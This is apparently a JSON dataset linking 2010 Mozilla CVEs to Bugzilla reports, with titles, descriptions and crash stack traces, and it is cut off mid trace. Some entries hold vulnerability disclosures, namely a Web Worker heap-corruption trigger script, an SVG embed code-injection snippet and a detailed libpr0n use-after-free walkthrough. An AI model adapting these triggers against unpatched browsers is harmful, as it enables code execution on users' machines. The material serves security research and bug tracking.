{
  "year": 2010,
  "total": 119,
  "reference": "bugzilla.mozilla.org",
  "reports": {
    "CVE-2010-0160": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=531222",
        "title": "Using SSM off main thread",
        "description": "See attached stack."
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=533000",
        "title": "Web Worker Array Handling Heap Corruption Vulnerability (ZDI-CAN-624)",
        "description": "Received this from ZDI today, from the same guy who found bug 514554: ZDI-CAN-624: Mozilla Firefox Web Worker Array Handling Heap Corruption Vulnerability -- ABSTRACT ------------------------------------------------------------ TippingPoint has identified a vulnerability affecting the following products: Mozilla Firefox 3.5.x -- VULNERABILITY DETAILS ----------------------------------------------- This vulnerability allows remote attackers to execute arbitrary code on vulnerable installations of Mozilla Firefox. User interaction is required to exploit this vulnerability in that the target must visit a malicious page. The specific flaw exists within the implementation of web worker threads. Due to mishandling the array data type while processing posted messages, a web worker thread can be made to corrupt heap memory. An attacker can exploit this vulnerability to execute arbitrary code under the context of the user running the browser. Version(s) tested: Firefox 3.5 Platform(s) tested: Vista 32, 64 The faulty code resides within the handling of postMessage method calls. Specifically, the passing of an array argument to a postMessage call as follows: var sprayContainer = new Array(); var worker = new Worker(\"crash.js\"); for (i=0; i<600; i++) { worker.postMessage(sprayContainer[i]); } -------------------------------------------- where crash.js contains: -------------------------------------------- onmessage = function(event){ var worker = new Worker(\"workCRASH1.js\"); worker.onmessage = function(event) { worker.postMessage(event.data); postMessage(event.data); }; worker.postMessage(event.data); postMessage(event.data); } -- CREDIT -------------------------------------------------------------- This vulnerability was discovered by: * Orlando Barrera II, SecTheory"
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=534051",
        "title": "Workers: Don't change the global object while GC is running",
        "description": "We're setting the global object on the context from another thread outside of a request. That's bad according to all sane peers, so we should stop. Also, I think we should check request depth inside JS_SetGlobalObject."
      }
    ],
    "CVE-2010-0161": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=511806",
        "title": "Crash when using SSPI and joined to AD under Vista or later [@ strcat - nsImapFlagAndUidState::AddUidCustomFlagPair]",
        "description": "User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.2) Gecko/20090803 Fedora/3.5.2-2.fc11 Firefox/3.5.2 Build Identifier: 3.0b3 / 20090715140311 The UC Berkeley central email system recently enabled GSSAPI support for SMTP, IMAP, and POP. Thunderbird 2.0.0.22 on Windows XP when joined to AD works fine; however, under Vista or Windows 7 (and joined to AD), Thunderbird crashes when attempting to use SSPI. Thunderbird 2, by default, will always attempt to use SSPI during SMTP, and we've received widespread reports across campus of Thunderbird crashing when attempting to send email. Setting network.auth-use-sspi to false returns Thunderbird to a stable state. We have been unable to get Talkback data for Thunderbird 2, so we've replicated the problem with Thunderbird 3.0b3 and Breakpad, which appears to also crash under SSPI. This bug may be a duplicate of bug 505971. However, since this behaviour is widespread in our environment, and Thunderbird immediately crashes with SMTP or IMAP when joined to AD on Vista or later and SSPI is enabled it seems worthwhile to file a separate bug report. Reproducible: Always Steps to Reproduce: 1. Join Windows Vista (or later) machine to CAMPUS.BERKELEY.EDU AD 2. Configure Thunderbird client to use calmail.berkeley.edu (which will advertise AUTH=GSSAPI for SSL/TLS connections). 3. Attempt to send email with Thunderbird 2 (or under Thunderbird 3, check \"Use secure authentication\" for SMTP setup) or retrieve email with \"Use secure authentication\" checked for IMAP/POP Actual Results: Thunderbird crashes. Expected Results: Thunderbird performs GSSAPI SASL negotiation and sends email or retrieves email. http://crash-stats.mozilla.com/report/index/40d6d04c-6423-47b1-898d-6a8a62090820 is a crash of 3.0b3 under Vista using SSPI to login to IMAP."
      }
    ],
    "CVE-2010-0162": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=455472",
        "title": "[FIX]code injection with Content-Type: application/octet-stream, embed and svg - no plugins required",
        "description": "ability to upload file with Content-Type: application/octet-stream to a web server means ability to execute javascript from the same server. done via: <embed id=\"s1\" type=\"image/svg+xml\" src=\"http://sarwar/svgim1.bin\"> svgim1.bin is svg containing javascript no plugins are required"
      }
    ],
    "CVE-2010-0164": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=547143",
        "title": "libpr0n imgContainer Bits-Per-Pixel Change Remote Code Execution Vulnerability (ZDI-CAN-693)",
        "description": "ZDI-CAN-693: Mozilla Firefox libpr0n imgContainer Bits-Per-Pixel Change Remote Code Execution Vulnerability -- ABSTRACT ------------------------------------------------------------ TippingPoint has identified a vulnerability affecting the following products: Mozilla Firefox 3.5.x -- VULNERABILITY DETAILS ----------------------------------------------- This vulnerability allows remote attackers to execute arbitrary code on vulnerable installations of Mozilla Firefox. User interaction is required to exploit this vulnerability in that the target must visit a malicious page or open a malicious file. The specific flaw exists within the libpr0n library which is responsible for handling image caching and animation and is due to the way the application handle animations received from the server via the multipart/x-mixed-replace mime. During a case where the bits-per-pixel changes, the application will free a pointer and then can be made to reuse the freed pointer later. This can lead to code execution under the context of the application. Mozilla utilizes libpr0n as it's image renderer. libpr0n is responsible for providing image encoding/decoding along with image caching and canvas reuse to the application. This library includes support for multipart-x-mixed-replace which can be utilized for streaming images or animation from a server over the http protocol. The vulnerability exists due to the library's ability to reuse a frame for animations where a new frame has a different bpp than the old frame. This leads to a pointer that gets freed, which can then be used in order to further an attacker into control of the process. The actual dangling pointer is located in the following code in the 'frame' variable. It occurs when the previous frame can not be reused for the next frame that gets added. The case can be hit when frame->GetFormat() != aformat. modules/libpr0n/src/imgContainer.cpp:539 imgFrame *frame = GetImgFrame(aFrameNum); if (!frame) return InternalAddFrame(aFrameNum, aX, aY, aWidth, aHeight, aFormat, /* aPaletteDepth = */ 0, imageData, imageLength, /* aPaletteData = */ nsnull, /* aPaletteLength = */ nsnull); // See if we can re-use the frame that already exists. nsIntRect rect = frame->GetRect(); if (rect.x != aX || rect.y != aY || rect.width != aWidth || rect.height != aHeight || frame->GetFormat() != aFormat) { delete frame; // XXX: pointer we want control of return InternalAddFrame(aFrameNum, aX, aY, aWidth, aHeight, aFormat, /* aPaletteDepth = */ 0, imageData, imageLength, /* aPaletteData = */ nsnull, /* aPaletteLength = */ nsnull); } Upon parsing an image, the decoder for the image will be initialized with the object responsible for loading. This code will later call AppendFrame to append an image to the current list. /* void init (in imgILoad aLoad); */ NS_IMETHODIMP nsJPEGDecoder::Init(imgILoad *aLoad) { mImageLoad = aLoad; mObserver = do_QueryInterface(aLoad); /* We set up the normal JPEG error routines, then override error_exit. */ mInfo.err = jpeg_std_error(&mErr.pub); /* mInfo.err = jpeg_std_error(&mErr.pub); */ mErr.pub.error_exit = my_error_exit; /* Establish the setjmp return context for my_error_exit to use. */ if (setjmp(mErr.setjmp_buffer)) { /* If we get here, the JPEG code has signaled an error. * We need to clean up the JPEG object, close the input file, and return. */ return NS_ERROR_FAILURE; } AppendFrame is relaly just a wrapper around InternalAddFrame. modules/libpr0n/src/imgContainer.cpp:479 NS_IMETHODIMP imgContainer::AppendFrame(PRInt32 aX, PRInt32 aY, PRInt32 aWidth, PRInt32 aHeight, gfxASurface::gfxImageFormat aFormat, PRUint8 **imageData, PRUint32 *imageLength) { NS_ENSURE_ARG_POINTER(imageData); NS_ENSURE_ARG_POINTER(imageLength); return InternalAddFrame(mNumFrames, aX, aY, aWidth, aHeight, aFormat, /* aPaletteDepth = */ 0, imageData, imageLength, /* aPaletteData = */ nsnull, /* aPaletteLength = */ nsnull); } InternalAddFrame will check if the frame length is 2, and then call StartAnimation as there's more than 1 frame to flip through. modules/libpr0n/src/imgContainer.cpp:421 nsresult imgContainer::InternalAddFrame(PRUint32 framenum, PRInt32 aX, PRInt32 aY, PRInt32 aWidth, PRInt32 aHeight, gfxASurface::gfxImageFormat aFormat, PRUint8 aPaletteDepth, PRUint8 **imageData, PRUint32 *imageLength, PRUint32 **paletteData, PRUint32 *paletteLength) { if (framenum > PRUint32(mNumFrames)) return NS_ERROR_INVALID_ARG; nsAutoPtr<imgFrame> frame(new imgFrame()); NS_ENSURE_TRUE(frame, NS_ERROR_OUT_OF_MEMORY); nsresult rv = frame->Init(aX, aY, aWidth, aHeight, aFormat, aPaletteDepth); NS_ENSURE_SUCCESS(rv, rv); if (mFrames.Length() == 0) { return InternalAddFrameHelper(framenum, frame.forget(), imageData, imageLength, paletteData, paletteLength); } ... // If this is our second frame (We've just added our second frame above), // count should now be 2. This must be called after we AppendObject // because StartAnimation checks for > 1 frames if (mFrames.Length() == 2) StartAnimation(); // XXX return rv; } StartAnimation will then fetch the current image frame, and then start a timeout for animating. modules/libpr0n/src/imgContainer.cpp:699 NS_IMETHODIMP imgContainer::StartAnimation() { if (mAnimationMode == kDontAnimMode || (mAnim && (mAnim->timer || mAnim->animating))) return NS_OK; if (mNumFrames > 1) { if (!ensureAnimExists()) return NS_ERROR_OUT_OF_MEMORY; // Default timeout to 100: the timer notify code will do the right // thing, so just get that started. PRInt32 timeout = 100; imgFrame *currentFrame = GetCurrentImgFrame(); // XXX: calls ::GetImgFrame if (currentFrame) { timeout = currentFrame->GetTimeout(); if (timeout <= 0) // -1 means display this frame forever return NS_OK; } Once reaching GetImgFrame, RestoreDiscardedData will get called, this will later called ReloadImages. modules/libpr0n/src/imgContainer.cpp:192 imgFrame *imgContainer::GetImgFrame(PRUint32 framenum) { nsresult rv = RestoreDiscardedData(); // XXX NS_ENSURE_SUCCESS(rv, nsnull); modules/libpr0n/src/imgContainer.cpp:933 NS_IMETHODIMP imgContainer::Notify(nsITimer *timer) { // Note that as long as the image is animated, it will not be discarded, // so this should never happen... nsresult rv = RestoreDiscardedData(); // XXX modules/libpr0n/src/imgContainer.cpp:1616 nsresult imgContainer::RestoreDiscardedData(void) { // mRestoreDataDone = PR_TRUE means that we want to timeout and then discard the image frames // So, we only need to restore, if mRestoreDataDone is true, and then only when the frames are discarded... if (!mRestoreDataDone) return NS_OK; // Reset timer, as the frames are accessed nsresult rv = ResetDiscardTimer(); NS_ENSURE_SUCCESS(rv, rv); if (!mDiscarded) return NS_OK; int num_expected_frames = mNumFrames; // To prevent that ReloadImages is called multiple times, reset the flag before reloading mDiscarded = PR_FALSE; rv = ReloadImages(); // XXX Upon reaching ReloadImages, the library will ask the image decoder to initialize another image, which it will then write data to via the WriteFrom method of the decoder. modules/libpr0n/src/imgContainer.cpp:1830 nsresult result = decoder->Init(loader); if (NS_FAILED(result)) { PR_LOG(gCompressedImageAccountingLog, PR_LOG_WARNING, (\"CompressedImageAccounting: imgContainer::ReloadImages() image container %p \" \"failed to initialize the decoder (%s)\", this, mDiscardableMimeType.get())); return result; } ... // |WriteFrom()| may fail if the original data is broken. PRUint32 written; (void)decoder->WriteFrom(stream, mRestoreData.Length(), &written); // XXX modules/libpr0n/decoders/jpeg/nsJPEGDecoder.cpp:259 /* unsigned long writeFrom (in nsIInputStream inStr, in unsigned long count); */ NS_IMETHODIMP nsJPEGDecoder::WriteFrom(nsIInputStream *inStr, PRUint32 count, PRUint32 *writeCount) { NS_ENSURE_ARG_POINTER(inStr); NS_ENSURE_ARG_POINTER(writeCount); /* necko doesn't propagate the errors from ReadDataOut */ nsresult rv = inStr->ReadSegments(ReadDataOut, this, count, writeCount); // XXX modules/libpr0n/decoders/jpeg/nsJPEGDecoder.cpp:240 static NS_METHOD ReadDataOut(nsIInputStream* in, void* closure, const char* fromRawSegment, PRUint32 toOffset, PRUint32 count, PRUint32 *writeCount) { nsJPEGDecoder *decoder = static_cast<nsJPEGDecoder*>(closure); nsresult rv = decoder->ProcessData(fromRawSegment, count, writeCount); //XXX modules/libpr0n/decoders/jpeg/nsJPEGDecoder.cpp:276 nsresult nsJPEGDecoder::ProcessData(const char *data, PRUint32 count, PRUint32 *writeCount) { LOG_SCOPE_WITH_PARAM(gJPEGlog, \"nsJPEGDecoder::ProcessData\", \"count\", count); Upon parsing all useful data for the jpeg image, the library will then call EnsureCleanFrame, to allocate a frame at a particular index. modules/libpr0n/decoders/jpeg/nsJPEGDecoder.cpp:458 /* verify that the width and height of the image are the same as * the container we're about to put things in to. * XXX it might not matter maybe we should just resize the image. */ PRInt32 width, height; mImage->GetWidth(&width); mImage->GetHeight(&height); if (width == 0 && height == 0) { mImage->Init(mInfo.image_width, mInfo.image_height, mObserver); } else if ((width != (PRInt32)mInfo.image_width) || (height != (PRInt32)mInfo.image_height)) { mState = JPEG_ERROR; return NS_ERROR_UNEXPECTED; } mImage->Init(mInfo.image_width, mInfo.image_height, mObserver); mObserver->OnStartContainer(nsnull, mImage); // Use EnsureCleanFrame so we don't create a new frame if we're being // reused for e.g. multipart/x-replace PRUint32 imagelength; if (NS_FAILED(mImage->EnsureCleanFrame(0, 0, 0, mInfo.image_width, mInfo.image_height, gfxASurface::ImageFormatRGB24, &mImageData, &imagelength))) { // XXX EnsureCleanFrame will then get called. This will allocate a new frame via InternalAddFrame at the specified Index..Unless the format is different. modules/libpr0n/src/imgContainer.cpp:515 /* [noscript] void ensureCleanFrame(in unsigned long aFramenum, in PRInt32 aX, in PRInt32 aY, in PRInt32 aWidth, in PRInt32 aHeight, in gfxImageFormat aFormat, [array, size_is(imageLength)] out PRUint8 imageData, out unsigned long imageLength); */ NS_IMETHODIMP imgContainer::EnsureCleanFrame(PRUint32 aFrameNum, PRInt32 aX, PRInt32 aY, PRInt32 aWidth, PRInt32 aHeight, gfxASurface::gfxImageFormat aFormat, PRUint8 **imageData, PRUint32 *imageLength) { NS_ENSURE_ARG_POINTER(imageData); NS_ENSURE_ARG_POINTER(imageLength); if (aFrameNum > PRUint32(mNumFrames)) return NS_ERROR_INVALID_ARG; // Adding a frame that doesn't already exist. if (aFrameNum == PRUint32(mNumFrames)) return InternalAddFrame(aFrameNum, aX, aY, aWidth, aHeight, aFormat, /* aPaletteDepth = */ 0, imageData, imageLength, /* aPaletteData = */ nsnull, /* aPaletteLength = */ nsnull); imgFrame *frame = GetImgFrame(aFrameNum); if (!frame) return InternalAddFrame(aFrameNum, aX, aY, aWidth, aHeight, aFormat, /* aPaletteDepth = */ 0, imageData, imageLength, /* aPaletteData = */ nsnull, /* aPaletteLength = */ nsnull); // See if we can re-use the frame that already exists. nsIntRect rect = frame->GetRect(); if (rect.x != aX || rect.y != aY || rect.width != aWidth || rect.height != aHeight || frame->GetFormat() != aFormat) { delete frame; return InternalAddFrame(aFrameNum, aX, aY, aWidth, aHeight, aFormat, /* aPaletteDepth = */ 0, imageData, imageLength, /* aPaletteData = */ nsnull, /* aPaletteLength = */ nsnull); } Due to the format being different, the deleted frame will still remain in the list of containers at which point an attacker will need to figure out how to get the frame to be utilized in the current execution path. One example would be upon image container destruction. modules/libpr0n/src/imgContainer.cpp:90 imgContainer::~imgContainer() { if (mAnim) delete mAnim; for (unsigned int i = 0; i < mFrames.Length(); ++i) delete mFrames[i]; Version(s) tested: Mozilla Firefox 3.6 Platform(s) tested: Windows XP SP3 -- CREDIT -------------------------------------------------------------- This vulnerability was discovered by: * regenrecht"
      }
    ],
    "CVE-2010-0165": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=542849",
        "title": "Assertion failure: targetObj == globalObj in TraceRecorder::traverseScopeChain",
        "description": "1. http://www.vanguardia.com.mx/ 2. Assertion failure: targetObj == globalObj, at /work/mozilla/builds/1.9.2/mozilla/js/src/jstracer.cpp:12700 1.9.2 win/mac. couldn't reproduce on 1.9.3 mac. sensitive cause the assertion seems scary. saved version of the page didn't assert. Program received signal SIGTRAP, Trace/breakpoint trap. JS_Assert (s=0x44784e \"targetObj == globalObj\", file=0x4442c0 \"/work/mozilla/builds/1.9.2/mozilla/js/src/jstracer.cpp\", ln=12700) at /work/mozilla/builds/1.9.2/mozilla/js/src/jsutil.cpp:69 69 abort(); (gdb) bt #0 JS_Assert (s=0x44784e \"targetObj == globalObj\", file=0x4442c0 \"/work/mozilla/builds/1.9.2/mozilla/js/src/jstracer.cpp\", ln=12700) at /work/mozilla/builds/1.9.2/mozilla/js/src/jsutil.cpp:69 #1 0x003cf13d in TraceRecorder::traverseScopeChain (this=0x18165b00, obj=0x155578e0, obj_ins=0x10a2d60, targetObj=0x155576c0, targetIns=@0xbfffbbb4) at /work/mozilla/builds/1.9.2/mozilla/js/src/jstracer.cpp:12700 #2 0x003e0963 in TraceRecorder::callProp (this=0x18165b00, obj=0x155576c0, obj2=0x155576c0, prop=0x1ed03530, id=4547668, vp=@0xbfffbd18, ins=@0xbfffbd14, nr=@0xbfffbd00) at /work/mozilla/builds/1.9.2/mozilla/js/src/jstracer.cpp:7750 #3 0x003e111c in TraceRecorder::scopeChainProp (this=0x18165b00, obj=0x155576c0, vp=@0xbfffbd18, ins=@0xbfffbd14, nr=@0xbfffbd00) at /work/mozilla/builds/1.9.2/mozilla/js/src/jstracer.cpp:7691 #4 0x003e11ef in TraceRecorder::name (this=0x18165b00, vp=@0xbfffbd18, ins=@0xbfffbd14, nr=@0xbfffbd00) at /work/mozilla/builds/1.9.2/mozilla/js/src/jstracer.cpp:11972 #5 0x003e1724 in TraceRecorder::record_JSOP_NAME (this=0x18165b00) at /work/mozilla/builds/1.9.2/mozilla/js/src/jstracer.cpp:12275 #6 0x003e76bd in TraceRecorder::monitorRecording (cx=0x1e988000, tr=0x18165b00, op=JSOP_NAME) at jsopcode.tbl:180 #7 0x002f5528 in js_Interpret (cx=0x1e988000) at jsops.cpp:79 #8 0x00320cb0 in js_Invoke (cx=0x1e988000, argc=1, vp=0x1ea1a26c, flags=0) at jsinterp.cpp:1368 #9 0x002e5b24 in js_fun_apply (cx=0x1e988000, argc=1, vp=0x1ea1a234) at /work/mozilla/builds/1.9.2/mozilla/js/src/jsfun.cpp:2046 #10 0x0030cde3 in js_Interpret (cx=0x1e988000) at jsops.cpp:2208 #11 0x0031f58b in js_Execute (cx=0x1e988000, chain=0x15099020, script=0x1eba5a00, down=0x0, flags=0, result=0x0) at jsinterp.cpp:1601"
      }
    ],
    "CVE-2010-0166": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=538065",
        "title": "\"ASSERTION: invalid array index\" with glyphruns at YouTube",
        "description": "In debug Firefox trunk, loading any YouTube video page triggers: ###!!! ASSERTION: invalid array index: 'i < Length()', file ../../../dist/include/nsTArray.h, line 317 #5 0x041418ae in NS_DebugBreak_P (aSeverity=1, aStr=0x42f9140 \"invalid array index\", aExpr=0x42e7e60 \"i < Length()\", aFile=0x42f84dc \"../../../dist/include/nsTArray.h\", aLine=317) at /Users/jruderman/central/xpcom/base/nsDebugImpl.cpp:360 #6 0x0419b602 in nsTArray<gfxTextRun::GlyphRun>::ElementAt (this=0x213333d4, i=1) at nsTArray.h:317 #7 0x0419b636 in nsTArray<gfxTextRun::GlyphRun>::operator[] (this=0x213333d4, i=1) at nsTArray.h:350 #8 0x04197fb7 in gfxTextRun::SanitizeGlyphRuns (this=0x213333c0) at /Users/jruderman/central/gfx/thebes/src/gfxFont.cpp:2725 ..."
      }
    ],
    "CVE-2010-0167": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=534082",
        "title": "Crash at Wikipedia with -moz-column and list-item [@ nsLineBox::MarkDirty()] [@ nsBlockFrame::DoRemoveFrame(nsIFrame*, unsigned int)]",
        "description": "1. http://en.wikipedia.org/wiki/Special:Search?search=house 2. crash 1.9.3 but not 1.9.2 + this 0xdddddddd {mFirstChild=??? mBounds={...} mAscent=??? ...} nsLineBox * const > gklayout.dll!nsLineBox::MarkDirty() Line 252 + 0x3 bytes C++ gklayout.dll!nsBlockFrame::DoRemoveFrame(nsIFrame * aDeletedFrame=0x00000000, unsigned int aFlags=0) Line 5406 C++ gklayout.dll!RemoveBlockChild(nsIFrame * aFrame=0x0915d560, int aRemoveOnlyFluidContinuations=1) Line 5183 C++ gklayout.dll!nsBlockFrame::DoRemoveFrame(nsIFrame * aDeletedFrame=0x0915d560, unsigned int aFlags=0) Line 5414 + 0x17 bytes C++ gklayout.dll!nsBlockFrame::DeleteNextInFlowChild(nsPresContext * aPresContext=0x05bf97a0, nsIFrame * aNextInFlow=0x0915d468, int aDeletingEmptyFrames=1) Line 5532 C++ gklayout.dll!nsBlockReflowContext::ReflowBlock(const nsRect & aSpace={...}, int aApplyTopMargin=0, nsCollapsingMargin & aPrevMargin={...}, int aClearance=0, int aIsAdjacentWithTop=1, nsLineBox * aLine=0x0953a7d0, nsHTMLReflowState & aFrameRS={...}, unsigned int & aFrameReflowStatus=0, nsBlockReflowState & aState={...}) Line 359 C++ gklayout.dll!nsBlockFrame::ReflowBlockFrame(nsBlockReflowState & aState={...}, nsLineList_iterator aLine={...}, int * aKeepReflowGoing=0x0012a0cc) Line 3115 + 0x45 bytes C++ gklayout.dll!nsBlockFrame::ReflowLine(nsBlockReflowState & aState={...}, nsLineList_iterator aLine={...}, int * aKeepReflowGoing=0x0012a0cc) Line 2384 + 0x1b bytes C++ gklayout.dll!nsBlockFrame::ReflowDirtyLines(nsBlockReflowState & aState={...}) Line 1885 + 0x1b bytes C++ gklayout.dll!nsBlockFrame::Reflow(nsPresContext * aPresContext=0x05bf97a0, nsHTMLReflowMetrics & aMetrics={...}, const nsHTMLReflowState & aReflowState={...}, unsigned int & aStatus=3) Line 993 + 0xf bytes C++ gklayout.dll!nsContainerFrame::ReflowChild(nsIFrame * aKidFrame=0x0915d400, nsPresContext * aPresContext=0x05bf97a0, nsHTMLReflowMetrics & aDesiredSize={...}, const nsHTMLReflowState & aReflowState={...}, int aX=9242, int aY=0, unsigned int aFlags=0, unsigned int & aStatus=3, nsOverflowContinuationTracker * aTracker=0x00000000) Line 774 + 0x21 bytes C++ gklayout.dll!nsColumnSetFrame::ReflowChildren(nsHTMLReflowMetrics & aDesiredSize={...}, const nsHTMLReflowState & aReflowState={...}, unsigned int & aStatus=3, const nsColumnSetFrame::ReflowConfig & aConfig={...}, int aUnboundedLastColumn=0, nsCollapsingMargin * aBottomMarginCarriedOut=0x0012a794, nsColumnSetFrame::ColumnBalanceData & aColData={...}) Line 675 C++ gklayout.dll!nsColumnSetFrame::Reflow(nsPresContext * aPresContext=0x05bf97a0, nsHTMLReflowMetrics & aDesiredSize={...}, const nsHTMLReflowState & aReflowState={...}, unsigned int & aStatus=3) Line 1035 + 0x22 bytes C++ gklayout.dll!nsBlockReflowContext::ReflowBlock(const nsRect & aSpace={...}, int aApplyTopMargin=1, nsCollapsingMargin & aPrevMargin={...}, int aClearance=0, int aIsAdjacentWithTop=0, nsLineBox * aLine=0x08bcd480, nsHTMLReflowState & aFrameRS={...}, unsigned int & aFrameReflowStatus=3, nsBlockReflowState & aState={...}) Line 310 + 0x2c bytes C++ gklayout.dll!nsBlockFrame::ReflowBlockFrame(nsBlockReflowState & aState={...}, nsLineList_iterator aLine={...}, int * aKeepReflowGoing=0x0012af14) Line 3115 + 0x45 bytes C++ gklayout.dll!nsBlockFrame::ReflowLine(nsBlockReflowState & aState={...}, nsLineList_iterator aLine={...}, int * aKeepReflowGoing=0x0012af14) Line 2384 + 0x1b bytes C++ gklayout.dll!nsBlockFrame::ReflowDirtyLines(nsBlockReflowState & aState={...}) Line 1885 + 0x1b bytes C++ gklayout.dll!nsBlockFrame::Reflow(nsPresContext * aPresContext=0x05bf97a0, nsHTMLReflowMetrics & aMetrics={...}, const nsHTMLReflowState & aReflowState={...}, unsigned int & aStatus=0) Line 993 + 0xf bytes C++ gklayout.dll!nsBlockReflowContext::ReflowBlock(const nsRect & aSpace={...}, int aApplyTopMargin=1, nsCollapsingMargin & aPrevMargin={...}, int aClearance=0, int aIsAdjacentWithTop=0, nsLineBox * aLine=0x089eba88, nsHTMLReflowState & aFrameRS={...}, unsigned int & aFrameReflowStatus=0, nsBlockReflowState & aState={...}) Line 310 + 0x2c bytes C++ gklayout.dll!nsBlockFrame::ReflowBlockFrame(nsBlockReflowState & aState={...}, nsLineList_iterator aLine={...}, int * aKeepReflowGoing=0x0012ba2c) Line 3115 + 0x45 bytes C++ gklayout.dll!nsBlockFrame::ReflowLine(nsBlockReflowState & aState={...}, nsLineList_iterator aLine={...}, int * aKeepReflowGoing=0x0012ba2c) Line 2384 + 0x1b bytes C++ gklayout.dll!nsBlockFrame::ReflowDirtyLines(nsBlockReflowState & aState={...}) Line 1885 + 0x1b bytes C++ gklayout.dll!nsBlockFrame::Reflow(nsPresContext * aPresContext=0x05bf97a0, nsHTMLReflowMetrics & aMetrics={...}, const nsHTMLReflowState & aReflowState={...}, unsigned int & aStatus=0) Line 993 + 0xf bytes C++ gklayout.dll!nsBlockReflowContext::ReflowBlock(const nsRect & aSpace={...}, int aApplyTopMargin=1, nsCollapsingMargin & aPrevMargin={...}, int aClearance=0, int aIsAdjacentWithTop=1, nsLineBox * aLine=0x01bb03d0, nsHTMLReflowState & aFrameRS={...}, unsigned int & aFrameReflowStatus=0, nsBlockReflowState & aState={...}) Line 310 + 0x2c bytes C++ gklayout.dll!nsBlockFrame::ReflowBlockFrame(nsBlockReflowState & aState={...}, nsLineList_iterator aLine={...}, int * aKeepReflowGoing=0x0012c544) Line 3115 + 0x45 bytes C++ gklayout.dll!nsBlockFrame::ReflowLine(nsBlockReflowState & aState={...}, nsLineList_iterator aLine={...}, int * aKeepReflowGoing=0x0012c544) Line 2384 + 0x1b bytes C++ gklayout.dll!nsBlockFrame::ReflowDirtyLines(nsBlockReflowState & aState={...}) Line 1885 + 0x1b bytes C++ gklayout.dll!nsBlockFrame::Reflow(nsPresContext * aPresContext=0x05bf97a0, nsHTMLReflowMetrics & aMetrics={...}, const nsHTMLReflowState & aReflowState={...}, unsigned int & aStatus=0) Line 993 + 0xf bytes C++ gklayout.dll!nsBlockReflowContext::ReflowBlock(const nsRect & aSpace={...}, int aApplyTopMargin=1, nsCollapsingMargin & aPrevMargin={...}, int aClearance=0, int aIsAdjacentWithTop=1, nsLineBox * aLine=0x00000000, nsHTMLReflowState & aFrameRS={...}, unsigned int & aFrameReflowStatus=0, nsBlockReflowState & aState={...}) Line 310 + 0x2c bytes C++ gklayout.dll!nsBlockFrame::ReflowFloat(nsBlockReflowState & aState={...}, const nsRect & aFloatAvailableSpace={...}, nsIFrame * aFloat=0x01bafa20, nsMargin & aFloatMargin={...}, unsigned int & aReflowStatus=0) Line 5657 + 0x35 bytes C++ gklayout.dll!nsBlockReflowState::FlowAndPlaceFloat(nsIFrame * aFloat=0x01bafa20, unsigned int & aReflowStatus=0, int aForceFit=1) Line 768 C++ gklayout.dll!nsBlockReflowState::AddFloat(nsLineLayout * aLineLayout=0x0012d09c, nsIFrame * aFloat=0x01bafa20, int aAvailableWidth=58428, unsigned int & aReflowStatus=0) Line 580 + 0x17 bytes C++ gklayout.dll!nsLineLayout::AddFloat(nsIFrame * aFloat=0x01bafa20, int aAvailableWidth=58428, unsigned int & aReflowStatus=0) Line 218 C++ gklayout.dll!nsLineLayout::ReflowFrame(nsIFrame * aFrame=0x01bafa88, unsigned int & aReflowStatus=0, nsHTMLReflowMetrics * aMetrics=0x00000000, int & aPushedFrame=0) Line 892 + 0x1d bytes C++ gklayout.dll!nsBlockFrame::ReflowInlineFrame(nsBlockReflowState & aState={...}, nsLineLayout & aLineLayout={...}, nsLineList_iterator aLine={...}, nsIFrame * aFrame=0x01bafa88, LineReflowStatus * aLineReflowStatus=0x0012d024) Line 3745 + 0x16 bytes C++ gklayout.dll!nsBlockFrame::DoReflowInlineFrames(nsBlockReflowState & aState={...}, nsLineLayout & aLineLayout={...}, nsLineList_iterator aLine={...}, nsFlowAreaRect & aFloatAvailableSpace={...}, int & aAvailableSpaceHeight=0, nsFloatManager::SavedState * aFloatStateBeforeLine=0x0012d090, int * aKeepReflowGoing=0x0012d4a4, LineReflowStatus * aLineReflowStatus=0x0012d158, int aAllowPullUp=1) Line 3539 + 0x23 bytes C++ gklayout.dll!nsBlockFrame::ReflowInlineFrames(nsBlockReflowState & aState={...}, nsLineList_iterator aLine={...}, int * aKeepReflowGoing=0x0012d4a4) Line 3396 + 0x39 bytes C++ gklayout.dll!nsBlockFrame::ReflowLine(nsBlockReflowState & aState={...}, nsLineList_iterator aLine={...}, int * aKeepReflowGoing=0x0012d4a4) Line 2439 + 0x1b bytes C++ gklayout.dll!nsBlockFrame::ReflowDirtyLines(nsBlockReflowState & aState={...}) Line 1885 + 0x1b bytes C++ gklayout.dll!nsBlockFrame::Reflow(nsPresContext * aPresContext=0x05bf97a0, nsHTMLReflowMetrics & aMetrics={...}, const nsHTMLReflowState & aReflowState={...}, unsigned int & aStatus=0) Line 993 + 0xf bytes C++ gklayout.dll!nsBlockReflowContext::ReflowBlock(const nsRect & aSpace={...}, int aApplyTopMargin=0, nsCollapsingMargin & aPrevMargin={...}, int aClearance=0, int aIsAdjacentWithTop=1, nsLineBox * aLine=0x01bb0420, nsHTMLReflowState & aFrameRS={...}, unsigned int & aFrameReflowStatus=0, nsBlockReflowState & aState={...}) Line 310 + 0x2c bytes C++ gklayout.dll!nsBlockFrame::ReflowBlockFrame(nsBlockReflowState & aState={...}, nsLineList_iterator aLine={...}, int * aKeepReflowGoing=0x0012dfbc) Line 3115 + 0x45 bytes C++ gklayout.dll!nsBlockFrame::ReflowLine(nsBlockReflowState & aState={...}, nsLineList_iterator aLine={...}, int * aKeepReflowGoing=0x0012dfbc) Line 2384 + 0x1b bytes C++ gklayout.dll!nsBlockFrame::ReflowDirtyLines(nsBlockReflowState & aState={...}) Line 1885 + 0x1b bytes C++ gklayout.dll!nsBlockFrame::Reflow(nsPresContext * aPresContext=0x05bf97a0, nsHTMLReflowMetrics & aMetrics={...}, const nsHTMLReflowState & aReflowState={...}, unsigned int & aStatus=0) Line 993 + 0xf bytes C++ gklayout.dll!nsBlockReflowContext::ReflowBlock(const nsRect & aSpace={...}, int aApplyTopMargin=1, 